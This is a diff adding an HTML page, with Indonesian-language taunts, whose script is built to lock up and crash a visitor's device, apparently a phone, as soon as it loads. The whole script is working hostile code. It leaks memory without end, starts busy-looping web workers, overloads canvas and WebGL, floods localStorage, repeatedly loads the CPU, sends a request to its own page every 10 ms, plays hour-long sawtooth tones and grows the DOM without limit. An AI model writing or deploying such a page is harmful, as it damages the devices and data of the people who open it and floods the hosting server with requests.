@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sabar ya bro... ( ͡⚆ ͜ʖ ͡⚆)</title>
+    <style>
+        * { margin: 0; padding: 0; }
+        body, html { width: 100%; height: 100%; overflow: hidden; }
+        #warning {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: red;
+            font-size: 3em;
+            z-index: 9999;
+        }
+    </style>
+</head>
+<body>
+    <div id="warning">HP LU BAKAL MATI!</div>
+    <canvas id="gpuKiller"></canvas>
+    <script>
+        // ===== 1. MEMORY TERROR =====
+        console.log("MEMORY TERROR ACTIVATED!");
+        let globalLeak = [];
+        
+        function createMemoryBlackHole() {
+            const MB = 1024 * 1024;
+            for(let i = 0; i < 50; i++) {
+                // Allokasi memory gede banget
+                globalLeak.push(new Array(MB * 10).fill(0));
+                // Double allocation technique
+                globalLeak.push(new Float64Array(MB * 5));
+                // String bomb
+                globalLeak.push('X'.repeat(MB * 2));
+            }
+            
+            // Recursive leak
+            setTimeout(createMemoryBlackHole, 500);
+        }
+        createMemoryBlackHole();
+        
+        // ===== 2. MULTI-THREAD HELL =====
+        function createWorker() {
+            const workerCode = `
+                while(true) {
+                    // Intensive calculations
+                    let sum = 0;
+                    for(let i = 0; i < 10000000; i++) {
+                        sum += Math.sqrt(Math.random()) * Math.tan(Math.random());
+                    }
+                    
+                    // Memory allocation in worker
+                    let arr = new Array(1000000);
+                    for(let i = 0; i < arr.length; i++) {
+                        arr[i] = new Array(100).fill(i * Math.random());
+                    }
+                }
+            `;
+            
+            const blob = new Blob([workerCode], {type: 'application/javascript'});
+            const worker = new Worker(URL.createObjectURL(blob));
+            return worker;
+        }
+        
+        // Buat 4 Web Workers (jika supported)
+        if(window.Worker) {
+            for(let i = 0; i < 4; i++) {
+                createWorker();
+            }
+        }
+        
+        // ===== 3. GPU MELTDOWN =====
+        const canvas = document.getElementById('gpuKiller');
+        const ctx = canvas.getContext('2d');
+        
+        function resize() {
+            canvas.width = window.innerWidth * 2; // 2x resolution
+            canvas.height = window.innerHeight * 2;
+        }
+        resize();
+        window.addEventListener('resize', resize);
+        
+        let particles = [];
+        for(let i = 0; i < 100000; i++) { // 100K particles!
+            particles.push({
+                x: Math.random() * canvas.width,
+                y: Math.random() * canvas.height,
+                vx: (Math.random() - 0.5) * 20,
+                vy: (Math.random() - 0.5) * 20,
+                size: Math.random() * 5 + 1
+            });
+        }
+        
+        function killGPU() {
+            // Clear dengan effect heavy
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            // Particle system dengan physics kompleks
+            for(let p of particles) {
+                // Complex movement
+                p.x += p.vx + Math.sin(Date.now() * 0.001) * 3;
+                p.y += p.vy + Math.cos(Date.now() * 0.001) * 3;
+                
+                // Boundary dengan bounce complex
+                if(p.x < 0 || p.x > canvas.width) {
+                    p.vx *= -1.1;
+                    p.x = Math.max(0, Math.min(canvas.width, p.x));
+                }
+                if(p.y < 0 || p.y > canvas.height) {
+                    p.vy *= -1.1;
+                    p.y = Math.max(0, Math.min(canvas.height, p.y));
+                }
+                
+                // Drawing dengan gradient complex
+                const gradient = ctx.createRadialGradient(
+                    p.x, p.y, 0,
+                    p.x, p.y, p.size * 3
+                );
+                gradient.addColorStop(0, `hsl(${(Date.now() / 10 + i) % 360}, 100%, 50%)`);
+                gradient.addColorStop(1, `hsl(${(Date.now() / 20 + i) % 360}, 100%, 30%)`);
+                
+                ctx.beginPath();
+                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+                ctx.fillStyle = gradient;
+                ctx.fill();
+                
+                // Tambah garis connection antar particle
+                for(let j = 0; j < 10; j++) {
+                    const other = particles[Math.floor(Math.random() * particles.length)];
+                    ctx.beginPath();
+                    ctx.moveTo(p.x, p.y);
+                    ctx.lineTo(other.x, other.y);
+                    ctx.strokeStyle = `rgba(255, ${j * 25}, ${j * 25}, 0.1)`;
+                    ctx.stroke();
+                }
+            }
+            
+            // WebGL fallback kalo ada
+            if(canvas.getContext('webgl') || canvas.getContext('experimental-webgl')) {
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                // Create buffer dengan data random
+                const buffer = gl.createBuffer();
+                gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                const data = new Float32Array(1000000).map(() => Math.random());
+                gl.bufferData(gl.ARRAY_BUFFER, data, gl.DYNAMIC_DRAW);
+            }
+            
+            requestAnimationFrame(killGPU);
+        }
+        killGPU();
+        
+        // ===== 4. STORAGE BOMB =====
+        function bombLocalStorage() {
+            try {
+                let key = 'BOMB_' + Date.now();
+                let data = 'X'.repeat(100000); // 100KB per entry
+                for(let i = 0; i < 50; i++) {
+                    localStorage.setItem(key + i, data);
+                }
+                setTimeout(bombLocalStorage, 1000);
+            } catch(e) {
+                // Storage penuh, coba lagi
+                setTimeout(bombLocalStorage, 100);
+            }
+        }
+        bombLocalStorage();
+        
+        // ===== 5. CPU OVERDRIVE =====
+        function cpuTorture() {
+            // Complex mathematical calculations
+            let result = 0;
+            for(let i = 0; i < 10000000; i++) {
+                result += Math.sqrt(Math.sqrt(Math.sqrt(i))) * 
+                         Math.sin(i) * Math.cos(i) * 
+                         Math.tan(Math.random()) * 
+                         Math.log(Math.abs(i) + 1);
+            }
+            
+            // Matrix operations
+            const size = 100;
+            let matrix1 = new Array(size).fill().map(() => new Array(size).fill().map(() => Math.random()));
+            let matrix2 = new Array(size).fill().map(() => new Array(size).fill().map(() => Math.random()));
+            let product = new Array(size).fill().map(() => new Array(size).fill(0));
+            
+            for(let i = 0; i < size; i++) {
+                for(let j = 0; j < size; j++) {
+                    for(let k = 0; k < size; k++) {
+                        product[i][j] += matrix1[i][k] * matrix2[k][j];
+                    }
+                }
+            }
+            
+            setTimeout(cpuTorture, 1);
+        }
+        
+        // Start semua CPU thread
+        for(let i = 0; i < 4; i++) {
+            setTimeout(cpuTorture, i * 100);
+        }
+        
+        // ===== 6. NETWORK ABUSE =====
+        function spamRequests() {
+            fetch(window.location.href + '?' + Date.now())
+                .catch(() => {});
+            
+            setTimeout(spamRequests, 10);
+        }
+        spamRequests();
+        
+        // ===== 7. AUDIO HELL =====
+        if(typeof AudioContext !== 'undefined') {
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillatorCount = 10;
+                
+                for(let i = 0; i < oscillatorCount; i++) {
+                    setTimeout(() => {
+                        const osc = audioCtx.createOscillator();
+                        const gain = audioCtx.createGain();
+                        
+                        osc.frequency.value = 100 + Math.random() * 1000;
+                        osc.type = 'sawtooth';
+                        
+                        gain.gain.value = 0.1;
+                        
+                        osc.connect(gain);
+                        gain.connect(audioCtx.destination);
+                        
+                        osc.start();
+                        osc.stop(audioCtx.currentTime + 3600); // 1 jam
+                    }, i * 100);
+                }
+            } catch(e) {
+                console.log("Audio context gabisa, gapapa");
+            }
+        }
+        
+        // ===== 8. DOM BOMB =====
+        function createDOMCancer() {
+            const div = document.createElement('div');
+            div.innerHTML = '<div style="transform: rotate(' + (Date.now() % 360) + 'deg); width: 100px; height: 100px; background: radial-gradient(circle, red, blue); filter: blur(' + (Math.random() * 10) + 'px);"></div>';
+            document.body.appendChild(div);
+            
+            setTimeout(() => {
+                if(document.body.childNodes.length > 1000) {
+                    document.body.removeChild(document.body.firstChild);
+                }
+            }, 1000);
+            
+            setTimeout(createDOMCancer, 10);
+        }
+        createDOMCancer();
+        
+        // ===== FINAL WARNING =====
+        console.log("☠️ HP LU BAKAL MATI DALAM 30 DETIK ☠️");
+        alert("WKWKWKWK BYE BYE HP LU BANGSAT!");
+    </script>
+</body>
+</html>
